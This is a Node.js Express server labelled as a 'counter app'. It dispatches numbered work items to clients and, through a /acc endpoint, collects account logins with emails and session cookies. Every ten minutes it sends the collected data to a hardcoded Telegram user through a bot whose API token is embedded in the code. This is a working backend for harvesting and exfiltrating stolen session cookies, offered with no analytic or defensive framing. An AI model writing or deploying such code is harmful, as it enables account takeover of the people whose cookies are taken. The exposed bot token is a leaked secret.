const express = require('express');
const app = express();
const cors = require('cors');
const port = process.env.PORT || 3000;
const path = require('path');
const fs = require('fs');
const os = require('os');
const setupJsFileRoutes = require('./setupJsFileRoutes');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('7312691136:AAFfKYLuNfcGzxKWIsWW-a9inwV0B0cHENQ', { polling: false });
let motherObject = {};


app.use(express.text());
app.use(cors());

// Set up routes for JS files
setupJsFileRoutes(app).then(count => {
  console.log(`Set up ${count} routes for JS files`);
});


let counters = {
    "g-": 151310,
    "s-": 14460
};

let receivedCounters = {
    "g-": [],
    "s-": []
};

let startCounters = { ...counters };
let getRequestCount = 0;

// Rewritten updateStartCounter function
function updateStartCounter(type) {
    // Step 1: Sort all receivedCounters[type] from highest to lowest number
    receivedCounters[type].sort((a, b) => b - a);

    // Step 2: Perform a while loop
while (receivedCounters[type].length > 0) {
    // Step 3: Check if startCounters[type] is in receivedCounters[type]
    const index = receivedCounters[type].indexOf(startCounters[type]);
    if (index !== -1) {
        // Step 4: Decrement the start counter
        startCounters[type]--;
        // Remove the element from the array
        receivedCounters[type].splice(index, 1);
    } else {
        // Exit the loop if the condition is not met
        break;
    }

    // Remove all elements greater than startCounters[type]
    receivedCounters[type] = receivedCounters[type].filter(counter => counter <= startCounters[type]);
}

}

function processQueue() {
	counters = { ...startCounters };
    updateStartCounter("g-");
    updateStartCounter("s-");
    counters = { ...startCounters }; // Reset counters to start from the first unreceived counter
}

setInterval(processQueue, 95000); // Process queue every 1 minute

app.get('/', (req, res) => {
    let response;
    
    while (counters["g-"] > 0) {
        if (!receivedCounters["g-"].includes(counters["g-"])) {
            response = `g-${counters["g-"]--}`;
            break;
        }
        counters["g-"]--;
    }
    
    if (!response) {
        while (counters["s-"] > 0) {
            if (!receivedCounters["s-"].includes(counters["s-"])) {
                response = `s-${counters["s-"]--}`;
                break;
            }
            counters["s-"]--;
        }
    }
    
    if (!response) {
        return res.status(400).send("all done");
    }
	/*
    getRequestCount++;
    if (getRequestCount >= 10) {
        processQueue();
        getRequestCount = 0;
    }*/

    res.send(response);
    console.log(startCounters);
    console.log(receivedCounters);
});

app.post('/', (req, res) => {
    const counter = req.body; // This will now be a string
    const [type, value] = counter.split('-');
    
    if ((type === 'g' || type === 's') && !isNaN(Number(value))) {
        receivedCounters[`${type}-`].push(Number(value));
        res.send("Counter received");
    } else {
        res.status(400).send("Invalid counter format");
    }
});

// Add this after the existing code
app.post('/acc', (req, res) => {
  try {
    const data = JSON.parse(req.body); // Parse the text body as JSON
    const login = Object.keys(data)[0];
    
    if (login && data[login] && data[login].email && data[login].cookies) {
      motherObject[login] = data[login];
      res.status(200).send('Data received and stored successfully');
    } else {
      res.status(400).send('Invalid data format');
    }
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(400).send('Error processing the request');
  }
});

// Function to send motherObject as a text file via Telegram
function sendMotherObjectViaTelegram() {
  const userId = '7136999028'; // Replace with the actual Telegram user ID
  const text = JSON.stringify(motherObject, null, 2);
  
  // Create a temporary file
  const tempFilePath = path.join(os.tmpdir(), 'mother_object.txt');
  
  fs.writeFile(tempFilePath, text, (err) => {
    if (err) {
      console.error('Error writing temporary file:', err);
      return;
    }

    // Send the file
    bot.sendDocument(userId, tempFilePath, {}, {
      filename: 'mother_object.txt',
      contentType: 'text/plain',
    }).then(() => {
      // Delete the temporary file after sending
      fs.unlink(tempFilePath, (err) => {
        if (err) console.error('Error deleting temporary file:', err);
      });
    }).catch(error => console.error('Error sending file:', error));
  });
}
// Set up interval to send motherObject every 10 minutes
setInterval(sendMotherObjectViaTelegram, 10 * 60 * 1000);



app.listen(port, () => {
  console.log(`Counter app listening at http://localhost:${port}`);
});
